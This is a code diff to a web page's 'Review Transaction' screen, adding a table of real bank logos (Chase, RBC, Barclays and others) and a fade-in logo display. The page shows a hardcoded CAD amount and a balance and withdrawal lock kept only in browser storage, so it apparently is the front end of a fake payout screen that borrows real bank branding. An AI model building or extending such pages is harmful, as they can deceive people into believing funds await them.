@@ -132,6 +132,31 @@
             color: var(--text-primary);
         }
 
+        /* Method Logo Styling */
+        .method-logo-wrapper {
+            width: 70px;
+            height: 70px;
+            border-radius: 18px;
+            overflow: hidden;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            border: 1px solid rgba(124, 58, 237, 0.1);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        .method-logo-wrapper.is-hidden {
+            opacity: 0;
+            transform: scale(0.9);
+        }
+        .method-logo-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            padding: 4px;
+        }
+
         .flag-wrapper {
             font-size: 2rem;
             line-height: 1;
@@ -382,8 +407,11 @@
             <!-- STEP 1: REVIEW TRANSACTION STATE -->
             <div id="review-state">
                 <div class="card-header">
-                    <div class="flag-wrapper" id="badge-flag">🇬🇧</div>
-                    <h2>Review Transaction</h2>
+                    <!-- Updated to support custom preloaded brand logos dynamically -->
+                    <div class="method-logo-wrapper" id="brand-logo-container">
+                        <img id="dynamic-brand-logo" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png" alt="Payment Method">
+                    </div>
+                    <h2 id="review-title">Review Transaction</h2>
                 </div>
 
                 <hr class="divider">
@@ -498,7 +526,6 @@
             notification.hideTimer = setTimeout(() => { notification.classList.remove("show"); }, duration);
         }
 
-
         const bg = document.getElementById('floating-bg');
         const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
         function particle() {
@@ -540,19 +567,18 @@
 
         const isAlreadyWithdrawn = localStorage.getItem('av_is_withdrawn') === 'true';
 
-        // DYNAMIC ROUTING: Fetch selected region (US, UK, or CA) and method, falling back to US/Chase Bank if unassigned
+        // DYNAMIC ROUTING: Fetch selected region and method, falling back safely
         const activeRegion = localStorage.getItem("av_selected_region") || "US";
         const activeMethod = localStorage.getItem("av_selected_method_title") || "Chase Bank";
 
         let runtimeSessionData = {
-            region: activeRegion.toUpperCase(), // Ensure string safety
+            region: activeRegion.toUpperCase(), 
             selectedAssetOrBank: activeMethod,
             baseAmountCAD: 26779.97, 
             availableBalanceCAD: getLiveLocalStorageBalance(),
             balanceUnlockedFlag: isAlreadyWithdrawn
         };
 
-        // Normalize variations of country codes
         if (runtimeSessionData.region === "USA") {
             runtimeSessionData.region = "US";
         }
@@ -566,6 +592,43 @@
             CA: { flag: "🇨🇦", currency: "CAD", symbol: "$", eta: "1-2 hours via Faster Payments (EFT)" }
         };
 
+        /* ------------------------------------------------------------------
+        MASTER BRAND LOGO DATABASE (Synchronized with Dashboard Configurations)
+        ------------------------------------------------------------------ */
+        const globalBankLogos = {
+            // Canada (CA)
+            "RBC Royal Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/4889b91421334f04992dbd75abd44c94.jpg",
+            "TD Canada Trust": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/e90fc5400809adf33e281d9f876d5485.jpg",
+            "Scotiabank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/839782492ccfda0e5f616798c2646804.jpg",
+            "BMO": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/1352e3513e09b08d6559887eae7f8f7a.jpg",
+            "CIBC": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/39502b52ef053fc42561434042a06ecd.jpg",
+            "National Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/fb34b722f69d354bf24dd585444a6cee.jpg",
+            "Tangerine": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Tangerine_Bank-Logo.wine.png",
+            "Simplii Financial": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Simplii_Financial_branding.jpg",
+            
+            // United States (US)
+            "Chase Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/dcaa7faba74f565af7efbf1135c2e144.jpg",
+            "Bank of America": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/7826c02a5b48ea41e801cafcb0bba674.jpg",
+            "Wells Fargo": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Wells_Fargo_Logo_(2020).png",
+            "Citi (Citibank)": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/df079c7d167289b284e6bc9402a81c96.jpg",
+            "U.S. Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/US-Bank-Logo-700x394.png",
+            "PNC Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/PNClogo.svg.png",
+            "Capital One": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Capital_One_logo.svg.png",
+            "Fifth Third Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/logo-stacked-primary-full-thumb.png",
+            
+            // United Kingdom (UK)
+            "Barclays": "assets/pictures/Barclays-Logo-768x432.png",
+            "HSBC UK": "assets/pictures/HSBC-Logo-768x432.png",
+            "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
+            "Santander UK": "assets/pictures/WA_1783360589514.jpeg",
+            "Halifax": "assets/pictures/WA_1783360607640.jpeg",
+            "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
+            "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
+            "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
+        };
+
+        const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
+
         document.addEventListener("DOMContentLoaded", () => {
             initiateLiveTransaction(runtimeSessionData);
             setupEventHandlers();
@@ -577,10 +640,30 @@
             const config = regionConfig[sessionData.region];
             if (!config) return;
 
+            // ---- Brand Logo Mapping with Fade Transition Engine ----
+            const logoContainer = document.getElementById("brand-logo-container");
+            const brandLogoImage = document.getElementById("dynamic-brand-logo");
+            
+            const matchedLogoUrl = globalBankLogos[sessionData.selectedAssetOrBank] || defaultLogo;
+
+            if (logoContainer && brandLogoImage) {
+                // Fade out prior to loading
+                logoContainer.classList.add("is-hidden");
+
+                const imgPreloader = new Image();
+                imgPreloader.onload = () => {
+                    brandLogoImage.src = matchedLogoUrl;
+                    // Trigger browser UI thread reflow
+                    void logoContainer.offsetWidth;
+                    logoContainer.classList.remove("is-hidden");
+                };
+                imgPreloader.src = matchedLogoUrl;
+            }
+
             // Step 1: Establish baseline fallback conversion rates relative to 1 CAD
             let liveRate = 1.0; 
-            if (config.currency === "USD") liveRate = 0.72; // Fallback estimate for CAD to USD
-            if (config.currency === "GBP") liveRate = 0.53; // Fallback estimate for CAD to GBP
+            if (config.currency === "USD") liveRate = 0.72;
+            if (config.currency === "GBP") liveRate = 0.53;
 
             // Step 2: Dynamic API Fetch Exchange Rates (CAD base source)
             if (config.currency !== "CAD") {
@@ -605,7 +688,7 @@
                     }
                 }
             } else {
-                liveRate = 1.0; // 1:1 Rate conversion for domestic Canadian payouts (CAD to CAD)
+                liveRate = 1.0; 
             }
 
             const isSecurityOpen = sessionData.balanceUnlockedFlag;
@@ -613,7 +696,6 @@
             const sendBox = document.getElementById("send-box");
             const arrowIndicator = document.getElementById("indicator-arrow");
 
-            document.getElementById("badge-flag").innerText = config.flag;
             document.getElementById("payout-method").innerText = `${sessionData.selectedAssetOrBank}`;
             document.getElementById("arrival-time").innerText = config.eta;
 
@@ -621,14 +703,13 @@
             document.getElementById("receipt-hash").innerText = activeHash;
 
             if (isSecurityOpen) {
-                /* 1. CARDS REPOSITION ENGINE (DOM Order Flip) */
+                /* CARDS REPOSITION ENGINE (DOM Order Flip) */
                 sendBox.className = "amount-box locked order-1";       
                 balanceBox.className = "amount-box highlight order-2"; 
 
-                /* FIXED ARROW PLACEMENT: Perfect 66.7% position directly between the two active cards */
+                /* PERFECT ARROW PLACEMENT BETWEEN ACTIVE CARDS */
                 arrowIndicator.style.top = "66.7%";                     
 
-                /* 2. VALUE STATE SYNCHRONIZATION */
                 document.getElementById("send-lock").style.display = "inline-flex";
                 document.getElementById("send-currency-symbol").innerText = "";
                 document.getElementById("send-amount").innerText = "Withdrawn";
@@ -660,7 +741,6 @@
                 balanceBox.className = "amount-box locked order-1";
                 sendBox.className = "amount-box order-2";
 
-                /* DEFAULT STATE POSITIONING */
                 arrowIndicator.style.top = "66.7%";
 
                 document.getElementById("balance-lock").style.display = "inline-flex";
